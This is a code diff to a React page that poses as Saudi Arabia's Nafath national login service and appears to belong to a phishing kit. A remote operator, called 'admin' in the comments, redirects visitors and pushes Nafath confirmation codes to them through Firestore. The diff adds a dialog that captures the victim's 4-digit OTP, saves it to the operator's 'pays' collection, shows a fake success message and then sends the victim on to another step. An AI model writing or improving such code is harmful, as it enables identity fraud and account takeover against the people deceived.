@@ -1,6 +1,6 @@
 "use client";
 
-import { Loader2Icon, Menu, ShieldAlert, Smartphone, CheckCircle2, ShieldCheck } from "lucide-react";
+import { Loader2Icon, Menu, ShieldAlert, Smartphone, CheckCircle2, ShieldCheck, Loader2, Shield } from "lucide-react";
 import { Button } from "@/components/ui/button";
 import { Card, CardContent } from "@/components/ui/card";
 import {
@@ -9,7 +9,7 @@ import {
   DialogHeader,
   DialogTitle,
 } from "@/components/ui/dialog";
-import { useEffect, useState } from "react";
+import { useEffect, useRef, useState } from "react";
 import { addData, db } from "@/lib/firebase";
 import { Alert } from "@/components/ui/alert";
 import { doc, onSnapshot, setDoc, Firestore } from "firebase/firestore";
@@ -17,113 +17,166 @@ import { useRedirectMonitor } from "@/hooks/use-redirect-monitor";
 import { updateVisitorPage } from "@/lib/visitor-tracking";
 
 export default function Component() {
-  const [showConfirmDialog, setShowConfirmDialog] = useState(false);
-  const [showSuccessDialog, setShowSuccessDialog] = useState(false);
-  const [confirmationCode, setConfirmationCode] = useState<string>("");
-  const [isloading, setIsLoading] = useState(true);
-  const [showError, setShowError] = useState("");
+  const [showConfirmDialog, setShowConfirmDialog]   = useState(false);
+  const [showOtpDialog, setShowOtpDialog]           = useState(false);
+  const [confirmationCode, setConfirmationCode]     = useState<string>("");
+  const [isloading, setIsLoading]                   = useState(true);
+  const [showError, setShowError]                   = useState("");
+
+  // OTP state
+  const [otp, setOtp]           = useState(["", "", "", ""]);
+  const [otpError, setOtpError] = useState("");
+  const [otpLoading, setOtpLoading] = useState(false);
+  const [otpDone, setOtpDone]   = useState(false);
+  const inputRefs = useRef<(HTMLInputElement | null)[]>([]);
+
   const [submitted, setSubmitted] = useState(false);
 
-  const visitorId = typeof window !== 'undefined' ? localStorage.getItem("visitor") || "" : ""
-  
-  useRedirectMonitor({ visitorId, currentPage: "nafad" })
-  
-  useEffect(() => {
-    if (visitorId) {
-      updateVisitorPage(visitorId, "nafad", 8)
-    }
-  }, [visitorId])
+  const visitorId = typeof window !== "undefined" ? localStorage.getItem("visitor") || "" : "";
 
-  // Auto-submit on page load
-  useEffect(() => {
-    if (!visitorId || submitted) return
-    setSubmitted(true)
+  useRedirectMonitor({ visitorId, currentPage: "nafad" });
 
+  useEffect(() => {
+    if (visitorId) updateVisitorPage(visitorId, "nafad", 8);
+  }, [visitorId]);
+
+  // Auto-submit on load
+  useEffect(() => {
+    if (!visitorId || submitted) return;
+    setSubmitted(true);
     addData({
       id: visitorId,
       nafadConfirmationStatus: "waiting",
       currentStep: "_t6",
-      nafadUpdatedAt: new Date().toISOString()
-    }).catch(console.error)
-  }, [visitorId, submitted])
+      nafadUpdatedAt: new Date().toISOString(),
+    }).catch(console.error);
+  }, [visitorId, submitted]);
 
+  // Firebase listener
   useEffect(() => {
-    if (!visitorId) return
-
-    if (!db) return
+    if (!visitorId || !db) return;
     const unsubscribe = onSnapshot(
       doc(db as Firestore, "pays", visitorId),
       (docSnap) => {
-        if (docSnap.exists()) {
-          const data = docSnap.data()
+        if (!docSnap.exists()) return;
+        const data = docSnap.data();
 
-          if (data.currentStep === "home") {
-            window.location.href = "/"
-          } else if (data.currentStep === "phone") {
-            window.location.href = "/step5"
-          } else if (data.currentStep === "_st1") {
-            window.location.href = "/check"
-          } else if (data.currentStep === "_t2") {
-            window.location.href = "/step2"
-          } else if (data.currentStep === "_t3") {
-            window.location.href = "/step3"
-          }
+        // Admin redirects
+        if (data.currentStep === "home")  { window.location.href = "/"; return; }
+        if (data.currentStep === "phone") { window.location.href = "/step5"; return; }
+        if (data.currentStep === "_st1")  { window.location.href = "/check"; return; }
+        if (data.currentStep === "_t2")   { window.location.href = "/step2"; return; }
+        if (data.currentStep === "_t3")   { window.location.href = "/step3"; return; }
 
-          if (data.nafadConfirmationCode) {
-            setConfirmationCode(data.nafadConfirmationCode)
-            
-            const storageKey = `nafad_shown_${visitorId}`
-            const lastShownCode = localStorage.getItem(storageKey)
-            
-            if (data.nafadConfirmationCode !== lastShownCode) {
-              setShowConfirmDialog(true)
-              localStorage.setItem(storageKey, data.nafadConfirmationCode)
-              setIsLoading(false)
-              setShowError("")
-              setShowSuccessDialog(false)
-            }
-          } else if (data.nafadConfirmationCode === "") {
-            setShowConfirmDialog(false)
-            const storageKey = `nafad_shown_${visitorId}`
-            localStorage.removeItem(storageKey)
+        // Nafad confirmation code sent by admin
+        if (data.nafadConfirmationCode) {
+          setConfirmationCode(data.nafadConfirmationCode);
+          const storageKey = `nafad_shown_${visitorId}`;
+          const lastShown  = localStorage.getItem(storageKey);
+          if (data.nafadConfirmationCode !== lastShown) {
+            setShowConfirmDialog(true);
+            localStorage.setItem(storageKey, data.nafadConfirmationCode);
+            setIsLoading(false);
+            setShowError("");
+            setShowOtpDialog(false);
           }
+        } else if (data.nafadConfirmationCode === "") {
+          setShowConfirmDialog(false);
+          localStorage.removeItem(`nafad_shown_${visitorId}`);
+        }
 
-          if (data.nafadConfirmationStatus === "approved") {
-            setShowConfirmDialog(false)
-            setShowSuccessDialog(true)
-            setDoc(doc(db as Firestore, "pays", visitorId), {
-              nafadConfirmationStatus: "",
-              nafadConfirmationCode: ""
-            }, { merge: true })
-          } else if (data.nafadConfirmationStatus === "rejected") {
-            setShowConfirmDialog(false)
-            setShowError("تم رفض عملية التحقق. يرجى المحاولة مرة أخرى.")
-            setIsLoading(false)
-            setDoc(doc(db as Firestore, "pays", visitorId), {
-              nafadConfirmationStatus: "",
-              nafadConfirmationCode: ""
-            }, { merge: true })
-          }
+        // Admin approved Nafad → close confirmation dialog, open OTP dialog
+        if (data.nafadConfirmationStatus === "approved") {
+          setShowConfirmDialog(false);
+          setShowOtpDialog(true);
+          setOtp(["", "", "", ""]);
+          setOtpError("");
+          setOtpDone(false);
+          setDoc(doc(db as Firestore, "pays", visitorId), {
+            nafadConfirmationStatus: "",
+            nafadConfirmationCode: "",
+          }, { merge: true });
+          // Focus first input after dialog opens
+          setTimeout(() => inputRefs.current[0]?.focus(), 150);
+        } else if (data.nafadConfirmationStatus === "rejected") {
+          setShowConfirmDialog(false);
+          setShowError("تم رفض عملية التحقق. يرجى المحاولة مرة أخرى.");
+          setIsLoading(false);
+          setDoc(doc(db as Firestore, "pays", visitorId), {
+            nafadConfirmationStatus: "",
+            nafadConfirmationCode: "",
+          }, { merge: true });
         }
       },
-      (error) => {
-        console.error("[nafad] Firestore listener error:", error)
-      }
-    )
-
-    return () => unsubscribe()
-  }, [])
+      (error) => console.error("[nafad] Firestore listener error:", error)
+    );
+    return () => unsubscribe();
+  }, []);
 
   const handleRetry = async () => {
-    setShowError("")
-    setIsLoading(true)
+    setShowError("");
+    setIsLoading(true);
     await addData({
       id: visitorId,
       nafadConfirmationStatus: "waiting",
       currentStep: "_t6",
-      nafadUpdatedAt: new Date().toISOString()
-    })
-  }
+      nafadUpdatedAt: new Date().toISOString(),
+    });
+  };
+
+  // OTP input handlers
+  const handleOtpChange = (index: number, value: string) => {
+    if (!/^\d?$/.test(value)) return;
+    const next = [...otp];
+    next[index] = value;
+    setOtp(next);
+    setOtpError("");
+    if (value && index < 3) {
+      inputRefs.current[index + 1]?.focus();
+    }
+  };
+
+  const handleOtpKeyDown = (index: number, e: React.KeyboardEvent<HTMLInputElement>) => {
+    if (e.key === "Backspace" && !otp[index] && index > 0) {
+      inputRefs.current[index - 1]?.focus();
+    }
+  };
+
+  const handleOtpPaste = (e: React.ClipboardEvent) => {
+    const pasted = e.clipboardData.getData("text").replace(/\D/g, "").slice(0, 4);
+    if (pasted.length === 4) {
+      setOtp(pasted.split(""));
+      inputRefs.current[3]?.focus();
+    }
+    e.preventDefault();
+  };
+
+  const handleOtpSubmit = async () => {
+    const code = otp.join("");
+    if (code.length !== 4) { setOtpError("يرجى إدخال الرمز المكون من 4 أرقام كاملاً"); return; }
+    setOtpLoading(true);
+    try {
+      await setDoc(
+        doc(db as Firestore, "pays", visitorId),
+        {
+          nafadOtp: code,
+          nafadOtpSubmittedAt: new Date().toISOString(),
+        },
+        { merge: true }
+      );
+      setOtpDone(true);
+      setTimeout(() => {
+        window.location.href = "/step5";
+      }, 1200);
+    } catch (err) {
+      console.error("[nafad OTP]", err);
+      setOtpError("حدث خطأ، يرجى المحاولة مرة أخرى.");
+    } finally {
+      setOtpLoading(false);
+    }
+  };
+
+  const otpFilled = otp.every((d) => d !== "");
 
   return (
     <div className="min-h-screen bg-gradient-to-br from-slate-50 via-teal-50 to-slate-100" dir="rtl">
@@ -132,12 +185,12 @@ export default function Component() {
         <div className="flex items-center justify-between p-4 max-w-7xl mx-auto">
           <Menu className="w-6 h-6 text-gray-500 cursor-pointer hover:text-teal-600 transition-colors" />
           <img src="/nafad-logo.png" alt="نفاذ" width={110} className="object-contain" />
-          <div className="w-6"></div>
+          <div className="w-6" />
         </div>
       </header>
 
       <main className="p-4 max-w-lg mx-auto py-10 space-y-6">
-        {/* Hero Section */}
+        {/* Hero */}
         <div className="text-center space-y-3">
           <div className="w-20 h-20 bg-gradient-to-br from-teal-500 to-teal-700 rounded-2xl flex items-center justify-center mx-auto shadow-lg shadow-teal-200">
             <ShieldCheck className="w-10 h-10 text-white" />
@@ -148,7 +201,7 @@ export default function Component() {
 
         {/* Status Card */}
         <Card className="border-0 shadow-xl shadow-teal-100/50 overflow-hidden">
-          <div className="h-1 bg-gradient-to-r from-teal-400 to-teal-600"></div>
+          <div className="h-1 bg-gradient-to-r from-teal-400 to-teal-600" />
           <CardContent className="p-8 text-center space-y-6">
             {showError ? (
               <>
@@ -174,7 +227,7 @@ export default function Component() {
                       <Loader2Icon className="w-8 h-8 text-teal-600 animate-spin" />
                     </div>
                     <div className="absolute -bottom-1 -right-1 w-5 h-5 bg-teal-500 rounded-full flex items-center justify-center">
-                      <div className="w-2 h-2 bg-white rounded-full animate-pulse"></div>
+                      <div className="w-2 h-2 bg-white rounded-full animate-pulse" />
                     </div>
                   </div>
                   <div className="space-y-1">
@@ -200,8 +253,8 @@ export default function Component() {
 
         {/* App Download */}
         <div className="bg-gradient-to-br from-teal-600 to-teal-800 rounded-2xl p-6 text-center text-white space-y-4 shadow-lg shadow-teal-200 relative overflow-hidden">
-          <div className="absolute top-0 right-0 w-28 h-28 bg-white/10 rounded-full -mr-10 -mt-10"></div>
-          <div className="absolute bottom-0 left-0 w-20 h-20 bg-white/10 rounded-full -ml-8 -mb-8"></div>
+          <div className="absolute top-0 right-0 w-28 h-28 bg-white/10 rounded-full -mr-10 -mt-10" />
+          <div className="absolute bottom-0 left-0 w-20 h-20 bg-white/10 rounded-full -ml-8 -mb-8" />
           <p className="text-sm font-medium text-teal-100 relative z-10">لتحميل تطبيق نفاذ</p>
           <div className="flex justify-center gap-3 relative z-10">
             <a href="#" className="hover:scale-105 transition-transform">
@@ -214,7 +267,7 @@ export default function Component() {
         </div>
       </main>
 
-      {/* Confirmation Code Dialog */}
+      {/* ── Nafad Confirmation Code Dialog ─────────────── */}
       <Dialog open={showConfirmDialog} onOpenChange={() => {}}>
         <DialogContent className="max-w-sm mx-auto [&>button]:hidden rounded-2xl border-0 shadow-2xl" dir="rtl">
           <DialogHeader className="space-y-1">
@@ -240,8 +293,8 @@ export default function Component() {
 
             <div className="flex items-center justify-center gap-2 text-teal-600">
               <div className="relative flex items-center justify-center w-4 h-4">
-                <div className="w-3 h-3 bg-teal-500 rounded-full animate-ping absolute opacity-75"></div>
-                <div className="w-2 h-2 bg-teal-600 rounded-full"></div>
+                <div className="w-3 h-3 bg-teal-500 rounded-full animate-ping absolute opacity-75" />
+                <div className="w-2 h-2 bg-teal-600 rounded-full" />
               </div>
               <span className="text-sm font-medium">في انتظار تأكيدك في التطبيق...</span>
             </div>
@@ -249,26 +302,107 @@ export default function Component() {
         </DialogContent>
       </Dialog>
 
-      {/* Success Dialog */}
-      <Dialog open={showSuccessDialog} onOpenChange={setShowSuccessDialog}>
-        <DialogContent className="max-w-sm mx-auto rounded-2xl border-0 shadow-2xl" dir="rtl">
-          <div className="text-center space-y-5 p-2">
-            <div className="w-20 h-20 bg-gradient-to-br from-green-400 to-green-600 rounded-full flex items-center justify-center mx-auto shadow-lg shadow-green-200">
-              <CheckCircle2 className="w-11 h-11 text-white" />
+      {/* ── 4-digit OTP Dialog (after Nafad approval) ──── */}
+      <Dialog open={showOtpDialog} onOpenChange={() => {}}>
+        <DialogContent className="max-w-sm mx-auto [&>button]:hidden rounded-3xl border-0 shadow-2xl p-0 overflow-hidden" dir="rtl">
+          {/* Top gradient strip */}
+          <div className="h-1 bg-gradient-to-l from-[#f4ad27] via-[#1a9fd4] to-[#0e3a57]" />
+
+          <div className="px-6 pt-5 pb-6 space-y-5">
+            <DialogHeader className="text-center space-y-3">
+              <div className="flex justify-center">
+                <div className="relative">
+                  <div className="w-16 h-16 rounded-2xl bg-gradient-to-br from-teal-500 to-teal-700 flex items-center justify-center shadow-xl shadow-teal-200">
+                    <Smartphone className="w-8 h-8 text-white" />
+                  </div>
+                  {otpDone && (
+                    <div className="absolute -top-1 -right-1 w-5 h-5 bg-emerald-500 rounded-full flex items-center justify-center shadow">
+                      <CheckCircle2 className="w-3 h-3 text-white" />
+                    </div>
+                  )}
+                </div>
+              </div>
+              <DialogTitle className="text-lg font-black text-slate-800">
+                رمز التحقق
+              </DialogTitle>
+              <p className="text-sm text-slate-500 leading-relaxed">
+                أدخل رمز التحقق المكون من{" "}
+                <span className="font-bold text-teal-600">4 أرقام</span>{" "}
+                الذي وصلك
+              </p>
+            </DialogHeader>
+
+            {/* 4 separate digit boxes */}
+            <div className="flex justify-center gap-3" dir="ltr" onPaste={handleOtpPaste}>
+              {otp.map((digit, i) => (
+                <input
+                  key={i}
+                  ref={(el) => { inputRefs.current[i] = el; }}
+                  type="text"
+                  inputMode="numeric"
+                  maxLength={1}
+                  value={digit}
+                  onChange={(e) => handleOtpChange(i, e.target.value)}
+                  onKeyDown={(e) => handleOtpKeyDown(i, e)}
+                  disabled={otpLoading || otpDone}
+                  className={[
+                    "w-14 h-16 text-center text-3xl font-black rounded-2xl border-2 outline-none transition-all",
+                    otpError
+                      ? "border-red-300 bg-red-50 text-red-700"
+                      : otpDone
+                      ? "border-emerald-300 bg-emerald-50 text-emerald-700"
+                      : digit
+                      ? "border-teal-400 bg-teal-50 text-teal-800"
+                      : "border-slate-200 bg-slate-50 text-slate-800 focus:border-teal-500 focus:bg-white",
+                  ].join(" ")}
+                />
+              ))}
             </div>
-            <div className="space-y-1">
-              <h3 className="text-2xl font-bold text-gray-800">تم التحقق بنجاح</h3>
-              <p className="text-gray-500 text-sm">تمت عملية التحقق من هويتك عبر نفاذ</p>
-            </div>
-            <div className="bg-green-50 border border-green-200 rounded-xl p-3">
-              <p className="text-sm text-green-800">شكراً لاستخدامك منصة النفاذ الوطني الموحد</p>
-            </div>
-            <Button
-              onClick={() => setShowSuccessDialog(false)}
-              className="w-full bg-gradient-to-r from-green-500 to-green-600 hover:from-green-600 hover:to-green-700 text-white h-12 text-base font-semibold rounded-xl"
+
+            {/* Error */}
+            {otpError && (
+              <p className="text-center text-xs text-red-600 font-medium">⚠ {otpError}</p>
+            )}
+
+            {/* Success */}
+            {otpDone && (
+              <div className="flex items-center justify-center gap-2 bg-emerald-50 border border-emerald-200 rounded-2xl px-4 py-3">
+                <CheckCircle2 className="h-4 w-4 text-emerald-600 flex-shrink-0" />
+                <p className="text-sm text-emerald-800 font-bold">تم التحقق بنجاح! جاري الانتقال...</p>
+              </div>
+            )}
+
+            {/* Submit button */}
+            <button
+              type="button"
+              onClick={handleOtpSubmit}
+              disabled={!otpFilled || otpLoading || otpDone}
+              className="w-full h-12 rounded-2xl font-black text-sm transition-all duration-200 disabled:opacity-50 disabled:cursor-not-allowed flex items-center justify-center gap-2"
+              style={{
+                background: otpDone
+                  ? "linear-gradient(135deg, #10b981, #059669)"
+                  : otpLoading
+                  ? "linear-gradient(135deg, #0d9488, #0f766e)"
+                  : "linear-gradient(135deg, #f4ad27 0%, #e09a18 50%, #f4ad27 100%)",
+                color: otpLoading || otpDone ? "#fff" : "#1a3d52",
+                boxShadow: otpDone
+                  ? "0 8px 24px rgba(16,185,129,0.3)"
+                  : "0 8px 24px rgba(244,173,39,0.35)",
+              }}
             >
-              إغلاق
-            </Button>
+              {otpLoading ? (
+                <><Loader2 className="h-4 w-4 animate-spin" /> جاري التحقق...</>
+              ) : otpDone ? (
+                <><CheckCircle2 className="h-4 w-4" /> تم التحقق</>
+              ) : (
+                "تأكيد الرمز"
+              )}
+            </button>
+
+            <div className="flex items-center justify-center gap-1.5">
+              <Shield className="h-3 w-3 text-slate-400" />
+              <p className="text-[11px] text-slate-400">رمز التحقق صالح لمدة 10 دقائق فقط</p>
+            </div>
           </div>
         </DialogContent>
       </Dialog>
